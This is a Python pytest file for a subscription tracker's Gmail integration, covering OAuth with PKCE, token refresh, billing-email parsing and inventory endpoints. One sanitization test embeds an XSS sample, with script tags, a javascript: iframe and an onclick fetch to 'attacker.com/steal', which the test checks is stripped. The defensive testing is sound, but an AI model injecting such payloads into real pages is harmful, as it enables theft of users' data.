import base64
from datetime import datetime, timedelta, timezone
import hashlib
import os
import uuid
import httpx
import pytest
from fastapi.testclient import TestClient
from backend.app.main import app
from backend.app.database import get_email_account, initialize_schema
from backend.app.config import validate_oauth_config, is_live_oauth_configured as cfg_is_live
from backend.app.email import (
    confirm_candidate_into_inventory,
    disconnect_account,
    dismiss_candidate,
    evaluate_billing_email,
    exchange_code_for_tokens,
    generate_oauth_url,
    get_valid_access_token,
    group_and_deduplicate_candidates,
    is_live_oauth_configured,
    parse_billing_email,
    sync_user_mailbox,
)
from backend.app.email.oauth import generate_pkce_pair, refresh_access_token, _OAUTH_STATES
from backend.app.email.service import _fetch_live_gmail_candidates

client = TestClient(app)


@pytest.fixture(autouse=True)
def setup_db():
    initialize_schema()


# =============================================================================
# 1. OAuth Authorization & Security Tests
# =============================================================================

def test_oauth_authorization_url_generation():
    """Verify OAuth URL contains state, code_challenge, read-only scope, and offline access when live, or safe demo URL."""
    import os

    # 1. Demo mode URL
    url_demo, state_demo = generate_oauth_url(user_id="user_oauth_demo")
    assert state_demo is not None
    assert "state=" in url_demo

    # 2. Live configured OAuth URL
    os.environ["GOOGLE_CLIENT_ID"] = "test-client-id.apps.googleusercontent.com"
    os.environ["GOOGLE_CLIENT_SECRET"] = "test-client-secret"
    try:
        url_live, state_live = generate_oauth_url(user_id="user_oauth_test")
        assert "https://accounts.google.com/o/oauth2/v2/auth" in url_live
        assert "response_type=code" in url_live
        assert "client_id=test-client-id" in url_live
        assert f"state={state_live}" in url_live
        assert "code_challenge=" in url_live
        assert "code_challenge_method=S256" in url_live
        assert "access_type=offline" in url_live
        assert "gmail.readonly" in url_live
    finally:
        os.environ.pop("GOOGLE_CLIENT_ID", None)
        os.environ.pop("GOOGLE_CLIENT_SECRET", None)


def test_oauth_flow_endpoints_mock_mode():
    """Verify /api/email/oauth/url and callback succeed gracefully in demo/mock mode."""
    # 1. Get OAuth URL
    resp = client.get("/api/email/oauth/url", headers={"X-User-ID": "user_demo_1"})
    assert resp.status_code == 200
    data = resp.json()
    assert "url" in data
    assert "state" in data
    state = data["state"]

    # 2. Callback
    cb_resp = client.get(f"/api/email/oauth/callback?code=mock_code_123&state={state}")
    assert cb_resp.status_code == 200
    cb_data = cb_resp.json()
    assert cb_data["connected"] is True
    assert "user_demo_1" in cb_data["message"]

    # 3. Check status
    status_resp = client.get("/api/email/status", headers={"X-User-ID": "user_demo_1"})
    assert status_resp.status_code == 200
    status_data = status_resp.json()
    assert status_data["is_connected"] is True
    assert "@" in status_data["email_address"]

    # 4. Disconnect
    disc_resp = client.post("/api/email/disconnect", headers={"X-User-ID": "user_demo_1"})
    assert disc_resp.status_code == 200
    assert disc_resp.json()["disconnected"] is True

    # Check status after disconnect
    status_resp_after = client.get("/api/email/status", headers={"X-User-ID": "user_demo_1"})
    assert status_resp_after.json()["is_connected"] is False


# =============================================================================
# 2. Billing Email Parser Tests
# =============================================================================

def test_parser_extracts_billing_receipt_plain_text():
    """Verify deterministic parser extracts merchant, price, interval, and renewal date."""
    subject = "Your Netflix Subscription Receipt - Invoice #NF-88219"
    body = (
        "Dear Customer,\n\n"
        "Thank you for your payment of $19.99 USD for your Netflix Premium monthly plan.\n"
        "Your next billing renewal date is 2026-11-28.\n"
        "You can manage your membership anytime in Account Settings.\n"
    )

    candidate = parse_billing_email(
        message_id="msg_netflix_01",
        subject=subject,
        sender="billing@netflix.com",
        raw_content=body,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Netflix"
    assert candidate.estimated_cost == 19.99
    assert candidate.currency == "USD"
    assert candidate.billing_interval == "monthly"
    assert str(candidate.detected_renewal_date) == "2026-11-28"
    assert candidate.cancellation_signal is False
    assert candidate.confidence >= 0.85


def test_parser_html_sanitization_and_xss_protection():
    """Verify HTML email body is safely sanitized and malicious script payloads are stripped."""
    malicious_html = """
    <html>
      <body>
        <h1>Spotify Premium Renewal</h1>
        <p>Your subscription has renewed for $10.99/month.</p>
        <script>alert('XSS Exploit Attempt');</script>
        <iframe src="javascript:alert(1)"></iframe>
        <a href="javascript:void(0)" onclick="fetch('http://attacker.com/steal')">Click here</a>
      </body>
    </html>
    """

    candidate = parse_billing_email(
        message_id="msg_spotify_xss",
        subject="Spotify Renewal Confirmation",
        sender="no-reply@spotify.com",
        raw_content=malicious_html,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Spotify"
    assert candidate.estimated_cost == 10.99
    # Ensure script content is completely removed from extracted snippet
    snippet = candidate.email_snippet
    assert "<script>" not in snippet
    assert "alert(" not in snippet
    assert "<iframe>" not in snippet
    assert "javascript:" not in snippet


def test_parser_detects_cancellation_signal():
    """Verify parser flags cancellation confirmations and refund signals."""
    cancel_email = (
        "We're sorry to see you go. Your subscription to Disney+ has been successfully cancelled.\n"
        "Your access will continue until the end of your current billing period on 2026-11-01.\n"
    )

    candidate = parse_billing_email(
        message_id="msg_disney_cancel",
        subject="Cancellation Confirmation: Disney+",
        sender="disneyplus@mail.disneyplus.com",
        raw_content=cancel_email,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Disney+"
    assert candidate.cancellation_signal is True


def test_parser_filters_non_billing_emails():
    """Verify regular non-billing emails are rejected without false positives."""
    chat_email = (
        "Hey, are we still meeting tomorrow for coffee at 2 PM?\n"
        "Let me know if that time works for you!\n"
    )

    candidate = parse_billing_email(
        message_id="msg_friend_01",
        subject="Coffee tomorrow?",
        sender="friend@example.com",
        raw_content=chat_email,
    )

    assert candidate is None


# =============================================================================
# 3. Email Sync & Candidate Lifecycle Tests
# =============================================================================

def test_sync_mailbox_and_candidate_confirmation():
    """Verify end-to-end sync, candidate review, confirmation into unified inventory."""
    user_id = f"user_sync_{uuid.uuid4().hex[:8]}"

    # 1. Connect mailbox first
    auth_resp = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id})
    state = auth_resp.json()["state"]
    client.get(f"/api/email/oauth/callback?code=mock_code&state={state}")

    # 2. Trigger mailbox sync
    sync_resp = client.post("/api/email/sync", headers={"X-User-ID": user_id})
    assert sync_resp.status_code == 200
    sync_data = sync_resp.json()
    assert sync_data["synced_count"] >= 3

    # 3. Retrieve discovered candidates
    cand_resp = client.get("/api/email/candidates", headers={"X-User-ID": user_id})
    assert cand_resp.status_code == 200
    candidates = cand_resp.json()
    assert len(candidates) >= 3

    # Check that candidate has evidence and metadata
    cand = candidates[0]
    cand_id = cand["candidate_id"]
    assert cand["review_status"] == "pending"
    assert cand["merchant_name"] is not None
    assert cand["estimated_cost"] is not None

    # 4. Confirm candidate -> promotes to unified inventory
    conf_resp = client.post(f"/api/email/candidates/{cand_id}/confirm", headers={"X-User-ID": user_id})
    assert conf_resp.status_code == 200
    sub_data = conf_resp.json()

    assert sub_data["subscription_id"].startswith("sub_email_")
    assert sub_data["discovery_source"] == "email"
    assert sub_data["user_id"] == user_id
    assert sub_data["status"] == "active"

    # Verify candidate status changed to confirmed
    cand_after = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    confirmed_cand = next(c for c in cand_after if c["candidate_id"] == cand_id)
    assert confirmed_cand["review_status"] == "confirmed"

    # Verify subscription shows up in user's inventory
    inv_resp = client.get("/subscriptions", headers={"X-User-ID": user_id})
    assert inv_resp.status_code == 200
    inv = inv_resp.json()
    assert any(s["subscription_id"] == sub_data["subscription_id"] for s in inv)


def test_candidate_dismissal():
    """Verify dismissing a candidate updates status and does NOT add to inventory."""
    user_id = f"user_dismiss_{uuid.uuid4().hex[:8]}"

    # Connect & sync
    auth = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id}).json()
    client.get(f"/api/email/oauth/callback?code=mock&state={auth['state']}")
    client.post("/api/email/sync", headers={"X-User-ID": user_id})

    # Dismiss first candidate
    candidates = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    cand_to_dismiss = candidates[0]
    cand_id = cand_to_dismiss["candidate_id"]

    dismiss_resp = client.post(f"/api/email/candidates/{cand_id}/dismiss", headers={"X-User-ID": user_id})
    assert dismiss_resp.status_code == 200

    # Verify candidate is dismissed
    cand_after = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    d_cand = next(c for c in cand_after if c["candidate_id"] == cand_id)
    assert d_cand["review_status"] == "dismissed"


# =============================================================================
# 4. Configuration & Validation Tests
# =============================================================================

def test_config_validation_missing_client_id(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "some_secret")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert msg == "Missing GOOGLE_CLIENT_ID"
    assert "some_secret" not in (msg or "")


def test_config_validation_missing_client_secret(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert msg == "Missing GOOGLE_CLIENT_SECRET"


def test_config_validation_invalid_redirect_uri(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "valid_secret_123")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "ftp://invalid-uri")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert "GOOGLE_REDIRECT_URI" in (msg or "")


def test_config_validation_valid(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "valid_secret_123")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is True
    assert msg is None


def test_demo_fallback_when_credentials_absent(monkeypatch):
    monkeypatch.delenv("GOOGLE_CLIENT_ID", raising=False)
    monkeypatch.delenv("GOOGLE_CLIENT_SECRET", raising=False)
    assert cfg_is_live() is False
    url, state = generate_oauth_url(user_id="user_fallback")
    assert "/api/email/oauth/callback?code=mock_auth_code_demo_" in url


# =============================================================================
# 5. PKCE RFC 7636 and CSRF State Security Tests
# =============================================================================

def test_pkce_rfc7636_generation_and_challenge_correctness():
    """Verify code_challenge matches BASE64URL(SHA256(code_verifier))."""
    code_verifier, code_challenge = generate_pkce_pair()
    assert len(code_verifier) >= 43
    # Check that code_challenge is valid base64url without '=' padding
    assert "=" not in code_challenge

    expected_digest = hashlib.sha256(code_verifier.encode("ascii")).digest()
    expected_challenge = base64.urlsafe_b64encode(expected_digest).decode("ascii").rstrip("=")
    assert code_challenge == expected_challenge


def test_state_expiration_rejected():
    """Verify that states older than 10 minutes are expired and rejected."""
    old_state = "expired_test_state_12345"
    _OAUTH_STATES[old_state] = {
        "user_id": "test_user",
        "code_verifier": "test_verifier",
        "redirect_uri": "http://127.0.0.1:8000/api/email/oauth/callback",
        "created_at": datetime.now(timezone.utc) - timedelta(minutes=15),
    }

    with pytest.raises(ValueError, match="OAuth authorization session expired"):
        exchange_code_for_tokens(code="live_code_abc", state=old_state)


def test_live_oauth_invalid_state_rejected():
    """Verify that an unknown or mismatched state raises ValueError."""
    with pytest.raises(ValueError, match="Invalid, expired, or mismatched OAuth state parameter"):
        exchange_code_for_tokens(code="live_real_code_123", state="nonexistent_state")


# =============================================================================
# 6. Live OAuth Flow Mocked Tests (Google Token & Profile Endpoints)
# =============================================================================

def test_live_oauth_token_exchange_success_with_mocked_google(monkeypatch):
    """Verify successful token exchange, profile retrieval, and live account connection."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")

    # Generate genuine live auth URL
    url, state = generate_oauth_url(user_id="user_live_success")
    assert "accounts.google.com" in url

    # Mock Google Token & Profile endpoints
    def mock_google_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "oauth2.googleapis.com/token" in url_str:
            # Verify code_verifier is included in form payload
            body = request.read().decode("utf-8")
            assert "code_verifier=" in body
            assert "grant_type=authorization_code" in body
            return httpx.Response(
                200,
                json={
                    "access_token": "ya29.live_google_access_token_123",
                    "refresh_token": "1//live_google_refresh_token_456",
                    "expires_in": 3600,
                    "scope": "https://www.googleapis.com/auth/gmail.readonly",
                    "token_type": "Bearer",
                },
            )
        elif "gmail/v1/users/me/profile" in url_str:
            assert request.headers.get("authorization") == "Bearer ya29.live_google_access_token_123"
            return httpx.Response(
                200,
                json={
                    "emailAddress": "alice.subscriber@gmail.com",
                    "messagesTotal": 1420,
                    "threadsTotal": 850,
                    "historyId": "987654",
                },
            )
        return httpx.Response(404, text="Not Found")

    transport = httpx.MockTransport(mock_google_handler)
    mock_client = httpx.Client(transport=transport)

    status = exchange_code_for_tokens(
        code="genuine_google_auth_code_789",
        state=state,
        client=mock_client,
    )

    assert status.is_connected is True
    assert status.email_address == "alice.subscriber@gmail.com"
    assert status.mode == "live"
    assert status.is_live_configured is True
    assert "gmail.readonly" in status.scopes[0]

    # Verify DB status retrieval preserves live mode
    db_status = get_email_account("user_live_success")
    assert db_status.is_connected is True
    assert db_status.email_address == "alice.subscriber@gmail.com"
    assert db_status.mode == "live"


def test_live_oauth_access_denied_by_user(monkeypatch):
    """Verify that user cancellation or access denial on Google consent screen is handled cleanly."""
    resp = client.get("/api/email/oauth/callback?error=access_denied&state=some_state")
    assert resp.status_code == 400
    data = resp.json()
    err_msg = data.get("error", {}).get("message", "") or data.get("detail", {}).get("message", "")
    assert "access_denied" in err_msg


def test_live_oauth_token_exchange_failure_400(monkeypatch):
    """Verify token exchange error from Google raises descriptive, safe error."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")

    url, state = generate_oauth_url(user_id="user_token_fail")

    def mock_google_error(request: httpx.Request) -> httpx.Response:
        return httpx.Response(400, json={"error": "invalid_grant", "error_description": "Code expired"})

    transport = httpx.MockTransport(mock_google_error)
    mock_client = httpx.Client(transport=transport)

    with pytest.raises(ValueError, match="Code expired"):
        exchange_code_for_tokens(code="expired_code", state=state, client=mock_client)


def test_live_oauth_refresh_token_flow(monkeypatch):
    """Verify refreshing an expired access token using stored refresh token."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")

    # Set up user with refresh token in DB
    user_id = "user_refresh_test"
    from backend.app.database import save_email_account
    from backend.app.models import EmailAccountStatus
    initial_status = EmailAccountStatus(
        user_id=user_id,
        email_address="refresh.user@gmail.com",
        is_connected=True,
    )
    save_email_account(
        initial_status,
        refresh_token="1//refresh_token_abc",
        access_token="old_access_token_expired",
        expires_at=datetime.now(timezone.utc) - timedelta(minutes=10),
    )

    def mock_refresh_handler(request: httpx.Request) -> httpx.Response:
        assert "grant_type=refresh_token" in request.read().decode("utf-8")
        return httpx.Response(
            200,
            json={
                "access_token": "ya29.new_refreshed_access_token_999",
                "expires_in": 3600,
            },
        )

    transport = httpx.MockTransport(mock_refresh_handler)
    mock_client = httpx.Client(transport=transport)

    new_token = refresh_access_token(user_id=user_id, client=mock_client)
    assert new_token == "ya29.new_refreshed_access_token_999"


def test_disconnected_state_truthful_values():
    """Verify disconnected state returns is_connected=False, email_address=None, candidate_count=0."""
    status_resp = client.get("/api/email/status", headers={"X-User-ID": "user_completely_new"})
    assert status_resp.status_code == 200
    data = status_resp.json()
    assert data["is_connected"] is False
    assert data["email_address"] is None
    assert data["candidate_count"] == 0


# =============================================================================
# 7. Live Gmail Discovery Mocked API Tests
# =============================================================================

def test_live_gmail_discovery_successful_extraction():
    """Verify querying Gmail API for messages, fetching message bodies, and extracting candidates."""
    messages_payload = {
        "messages": [
            {"id": "msg_gmail_hulu_01", "threadId": "th_01"},
            {"id": "msg_gmail_adobe_02", "threadId": "th_02"},
        ]
    }

    hulu_email_html = """
    <div>
      <h2>Hulu Billing Notification</h2>
      <p>Your payment of $17.99 for Hulu (No Ads) has been received.</p>
      <p>Next renewal date: 2026-11-20.</p>
    </div>
    """
    hulu_encoded = base64.urlsafe_b64encode(hulu_email_html.encode("utf-8")).decode("ascii")

    adobe_email_html = """
    <div>
      <h2>Adobe Creative Cloud Invoice</h2>
      <p>Thank you for subscribing to Adobe Creative Cloud at $54.99 per month.</p>
      <p>Your next renewal is on 2026-12-05.</p>
    </div>
    """
    adobe_encoded = base64.urlsafe_b64encode(adobe_email_html.encode("utf-8")).decode("ascii")

    def mock_gmail_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            return httpx.Response(200, json=messages_payload)
        elif "messages/msg_gmail_hulu_01" in url_str:
            return httpx.Response(
                200,
                json={
                    "id": "msg_gmail_hulu_01",
                    "internalDate": "1730000000000",
                    "payload": {
                        "headers": [
                            {"name": "Subject", "value": "Your Hulu monthly receipt"},
                            {"name": "From", "value": "billing@hulu.com"},
                        ],
                        "parts": [
                            {"mimeType": "text/html", "body": {"data": hulu_encoded}},
                        ],
                    },
                },
            )
        elif "messages/msg_gmail_adobe_02" in url_str:
            return httpx.Response(
                200,
                json={
                    "id": "msg_gmail_adobe_02",
                    "internalDate": "1730005000000",
                    "payload": {
                        "headers": [
                            {"name": "Subject", "value": "Adobe Creative Cloud subscription billed"},
                            {"name": "From", "value": "billing@adobe.com"},
                        ],
                        "parts": [
                            {"mimeType": "text/html", "body": {"data": adobe_encoded}},
                        ],
                    },
                },
            )
        return httpx.Response(404, text="Not Found")

    transport = httpx.MockTransport(mock_gmail_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_live_token",
        user_id="user_gmail_live_test",
        max_messages=10,
        client=mock_client,
    )

    assert len(candidates) == 2
    hulu_cand = next(c for c in candidates if c.merchant_name == "Hulu")
    assert hulu_cand.estimated_cost == 17.99
    assert str(hulu_cand.detected_renewal_date) == "2026-11-20"
    # Ensure receipt does NOT establish user streaming activity/usage
    assert hulu_cand.detected_last_used is None

    adobe_cand = next(c for c in candidates if "Adobe" in c.merchant_name)
    assert adobe_cand.estimated_cost == 54.99
    assert str(adobe_cand.detected_renewal_date) == "2026-12-05"


def test_live_gmail_discovery_empty_mailbox():
    """Verify empty inbox returns zero candidates gracefully without error."""
    def mock_empty_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"messages": [], "resultSizeEstimate": 0})

    transport = httpx.MockTransport(mock_empty_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_token",
        user_id="user_empty_inbox",
        max_messages=10,
        client=mock_client,
    )
    assert candidates == []


def test_live_gmail_discovery_no_billing_messages():
    """Verify non-billing messages found by broad search are rejected during parsing."""
    personal_email = base64.urlsafe_b64encode(b"Hey, dinner this Friday at 7?").decode("ascii")

    def mock_chat_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            return httpx.Response(200, json={"messages": [{"id": "msg_chat_99"}]})
        return httpx.Response(
            200,
            json={
                "id": "msg_chat_99",
                "payload": {
                    "headers": [
                        {"name": "Subject", "value": "Dinner plans"},
                        {"name": "From", "value": "bob@gmail.com"},
                    ],
                    "body": {"data": personal_email},
                },
            },
        )

    transport = httpx.MockTransport(mock_chat_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_token",
        user_id="user_no_billing",
        max_messages=5,
        client=mock_client,
    )
    assert candidates == []


def test_live_gmail_discovery_receipt_does_not_set_last_used():
    """Verify email receipt arrival date is NEVER used as active user streaming/service usage."""
    cand = parse_billing_email(
        message_id="msg_test_usage_01",
        subject="Your Spotify Monthly Subscription",
        sender="billing@spotify.com",
        raw_content="Your plan renewed for $10.99. Next renewal date: 2026-12-15.",
        received_at=datetime(2026, 11, 15, tzinfo=timezone.utc),
    )
    assert cand is not None
    # Crucial safety check: receipt arrival date does not establish user usage
    assert cand.detected_last_used is None


def test_email_diagnostics_endpoint_returns_truthful_metrics():
    """Verify /api/email/diagnostics returns sanitized, truthful operational diagnostics."""
    resp = client.get("/api/email/diagnostics", headers={"X-User-ID": "user_diag_test"})
    assert resp.status_code == 200
    diag = resp.json()

    assert "mode" in diag
    assert "is_live_configured" in diag
    assert "oauth_valid" in diag
    assert "is_connected" in diag
    assert "messages_retrieved" in diag
    assert "duplicates_skipped" in diag
    assert "parsing_failures" in diag
    assert "candidate_count" in diag
    assert "inventory_summary" in diag
    assert "email_discovered_count" in diag["inventory_summary"]
    assert "manual_count" in diag["inventory_summary"]
    assert "demo_mock_count" in diag["inventory_summary"]


def test_reset_demo_data_endpoint_safely_preserves_manual():
    """Verify POST /api/demo/reset purges demo candidates but preserves manual user records."""
    user_id = "user_reset_preserve_test"

    # 1. Create a manual subscription
    man_resp = client.post(
        "/subscriptions",
        json={"service_name": "Preserved Manual Service", "monthly_cost": 29.99},
        headers={"X-User-ID": user_id},
    )
    assert man_resp.status_code == 201
    man_sub_id = man_resp.json()["subscription_id"]

    # 2. Simulate email sync to get demo candidates
    auth = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id}).json()
    client.get(f"/api/email/oauth/callback?code=mock_reset_code&state={auth['state']}")
    sync_resp = client.post("/api/email/sync", headers={"X-User-ID": user_id})
    assert sync_resp.status_code == 200
    candidates_before = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    assert len(candidates_before) > 0

    # 3. Call reset demo data
    reset_resp = client.post("/api/demo/reset", headers={"X-User-ID": user_id})
    assert reset_resp.status_code == 200
    assert reset_resp.json()["success"] is True

    # 4. Verify demo candidates are gone
    candidates_after = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    assert len(candidates_after) == 0

    # 5. Verify manual subscription is intact
    man_get = client.get(f"/subscriptions/{man_sub_id}", headers={"X-User-ID": user_id})
    assert man_get.status_code == 200
    assert man_get.json()["service_name"] == "Preserved Manual Service"


def test_subscriptions_source_filtering():
    """Verify /subscriptions accurately filters by source: demo, manual, and email."""
    user_id = "user_filter_source_test"

    # Add a manual subscription
    client.post(
        "/subscriptions",
        json={"service_name": "Filtering Manual SaaS", "monthly_cost": 15.00},
        headers={"X-User-ID": user_id},
    )

    # Filter demo: must return only demo/connector mock items
    demo_resp = client.get("/subscriptions?source=demo", headers={"X-User-ID": user_id})
    assert demo_resp.status_code == 200
    for s in demo_resp.json():
        assert (s.get("discovery_source") or "connector") in ("demo", "connector")

    # Filter manual: must return only manual items
    manual_resp = client.get("/subscriptions?source=manual", headers={"X-User-ID": user_id})
    assert manual_resp.status_code == 200
    manual_subs = manual_resp.json()
    assert len(manual_subs) >= 1
    for s in manual_subs:
        assert s["discovery_source"] == "manual"


def test_dashboard_ui_contains_source_filter_and_switch_tab():
    """Verify frontend assets include switchTab, source filter, diagnostics, and reset button."""
    app_js = client.get("/dashboard/app.js").text
    assert "function switchTab(tabId)" in app_js
    assert "window.switchTab = switchTab;" in app_js
    assert '$("source-filter")' in app_js
    assert "handleResetDemo" in app_js
    assert "/api/email/diagnostics" in app_js

    index_html = client.get("/dashboard/").text
    assert 'id="source-filter"' in index_html
    assert 'id="reset-demo-btn"' in index_html
    assert 'id="email-diagnostics-card"' in index_html


def test_live_gmail_candidate_401_refresh_retry():
    """Verify _fetch_live_gmail_candidates retries automatically on HTTP 401 using refreshed token."""
    call_count = {"list": 0}

    def mock_401_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            call_count["list"] += 1
            auth_header = request.headers.get("Authorization", "")
            if auth_header == "Bearer initial_expired_token":
                return httpx.Response(401, json={"error": {"code": 401, "message": "Token expired"}})
            elif auth_header == "Bearer mock_access_token_demo_refreshed":
                return httpx.Response(200, json={"messages": []})
        return httpx.Response(404)

    transport = httpx.MockTransport(mock_401_handler)
    mock_client = httpx.Client(transport=transport)

    cands = _fetch_live_gmail_candidates(
        access_token="initial_expired_token",
        user_id="user_test_401",
        max_messages=10,
        client=mock_client,
    )
    assert cands == []
    assert call_count["list"] == 2


# =============================================================================
# 8. Email Pipeline Diagnostic & Parsing Regression Tests
# =============================================================================

def test_regression_receipts_and_multi_currency():
    """Verify receipt extraction with multiple currencies, comma decimals, and itemized totals."""
    # 1. European currency with comma decimal
    eur_email = (
        "Bonjour,\n\n"
        "Votre recu Spotify Premium individuel pour le mois de novembre.\n"
        "Montant preleve : 14,99 \u20ac par mois.\n"
        "Prochaine date de facturation : 15 decembre 2026.\n"
        "Merci pour votre confiance.\n"
    )
    cand_eur = parse_billing_email(
        message_id="msg_eur_receipt_01",
        subject="Votre recu Spotify Premium",
        sender="no-reply@spotify.com",
        raw_content=eur_email,
    )
    assert cand_eur is not None
    assert cand_eur.merchant_name == "Spotify"
    assert cand_eur.estimated_cost == 14.99
    assert cand_eur.currency == "EUR"
    assert cand_eur.billing_interval == "monthly"
    assert str(cand_eur.detected_renewal_date) == "2026-12-15"

    # 2. British Pound invoice with separate subtotal and tax
    gbp_email = (
        "GitHub Invoice #GH-88219\n"
        "Billed to: Loki\n"
        "GitHub Copilot for Business\n"
        "Subtotal: £16.00\n"
        "VAT (0%): £0.00\n"
        "Total charged: £16.00 GBP\n"
        "Next renewal: 2026-11-20\n"
    )
    cand_gbp = parse_billing_email(
        message_id="msg_gbp_receipt_02",
        subject="Your GitHub receipt - Invoice #GH-88219",
        sender="billing@github.com",
        raw_content=gbp_email,
    )
    assert cand_gbp is not None
    assert cand_gbp.merchant_name == "GitHub"
    assert cand_gbp.estimated_cost == 16.00
    assert cand_gbp.currency == "GBP"
    assert str(cand_gbp.detected_renewal_date) == "2026-11-20"


def test_regression_renewal_notice_with_evidence_based_confidence():
    """Verify renewal notice extracts future renewal date and calculates evidence-based confidence."""
    renewal_email = (
        "Dear Customer,\n\n"
        "Your Disney+ annual subscription will renew automatically on 2026-11-28.\n"
        "The recurring charge of $139.99 USD will be billed to your card on file.\n"
        "To make changes, manage your account at disneyplus.com.\n"
    )
    result = evaluate_billing_email(
        message_id="msg_disney_renew_01",
        subject="Upcoming Disney+ annual renewal notice",
        sender="disneyplus@mail.disneyplus.com",
        raw_content=renewal_email,
    )
    assert result.status == "candidate"
    assert result.candidate is not None
    cand = result.candidate
    assert cand.merchant_name == "Disney+"
    assert cand.estimated_cost == 139.99
    assert cand.currency == "USD"
    assert cand.billing_interval == "annual"
    assert str(cand.detected_renewal_date) == "2026-11-28"
    assert cand.confidence >= 0.85
    assert cand.detected_last_used is None


def test_regression_marketing_emails_skipped():
    """Verify promotional marketing emails are safely skipped and not treated as parser failures."""
    marketing_email = (
        "Don't miss out! Special limited-time discount.\n"
        "Upgrade today and save 50% on your next 3 months of Spotify Premium.\n"
        "Try 30 days free! Click here to subscribe now.\n"
    )
    result = evaluate_billing_email(
        message_id="msg_spotify_promo_01",
        subject="Special offer: Save 50% on Spotify Premium today!",
        sender="Spotify <marketing@spotify.com>",
        raw_content=marketing_email,
    )
    assert result.status == "skipped"
    assert result.reason == "marketing_promotional"
    assert result.candidate is None

    # parse_billing_email must return None
    assert parse_billing_email(
        message_id="msg_spotify_promo_01",
        subject="Special offer: Save 50% on Spotify Premium today!",
        sender="Spotify <marketing@spotify.com>",
        raw_content=marketing_email,
    ) is None


def test_regression_github_notifications_and_irrelevant_skipped():
    """Verify non-billing GitHub notifications, newsletters, and security alerts are classified as skipped."""
    # 1. GitHub activity notification
    gh_notification = (
        "Loki commented on pull request #42:\n"
        "We need to fix the payment confirmation logic and charge calculation.\n"
        "Reply to this email directly or view it on GitHub.\n"
    )
    gh_result = evaluate_billing_email(
        message_id="msg_gh_pr_01",
        subject="[GitHub] Re: Loki commented on issue #42: Payment logic error",
        sender="GitHub <notifications@github.com>",
        raw_content=gh_notification,
    )
    assert gh_result.status == "skipped"
    assert gh_result.reason == "github_activity_notification"

    # 2. Account security alert
    sec_email = (
        "We noticed a new sign-in to your Google Account from a Windows device in San Jose, CA.\n"
        "If this was you, you don't need to do anything. If not, secure your account.\n"
    )
    sec_result = evaluate_billing_email(
        message_id="msg_sec_alert_01",
        subject="Security alert: New sign-in on Windows",
        sender="Google <no-reply@accounts.google.com>",
        raw_content=sec_email,
    )
    assert sec_result.status == "skipped"
    assert sec_result.reason == "account_security_or_auth"

    # 3. Daily newsletter digest
    news_email = (
        "Here are today's top stories from The New York Times.\n"
        "1. Global Markets Update\n"
        "2. Tech News Roundup\n"
        "Plan your weekend with our curated stories.\n"
    )
    news_result = evaluate_billing_email(
        message_id="msg_nyt_news_01",
        subject="The New York Times: Top stories of the morning - your daily briefing",
        sender="The New York Times <newsletters@nytimes.com>",
        raw_content=news_email,
    )
    assert news_result.status == "skipped"
    assert news_result.reason == "newsletter_or_digest"

    # 4. Physical shipping notification
    ship_email = (
        "Your Amazon package #112-99812 has shipped!\n"
        "Tracking number: 1Z9999999999999999\n"
        "Out for delivery by 8 PM tomorrow.\n"
    )
    ship_result = evaluate_billing_email(
        message_id="msg_amz_ship_01",
        subject="Your Amazon package has shipped",
        sender="order-update@amazon.com",
        raw_content=ship_email,
    )
    assert ship_result.status == "skipped"
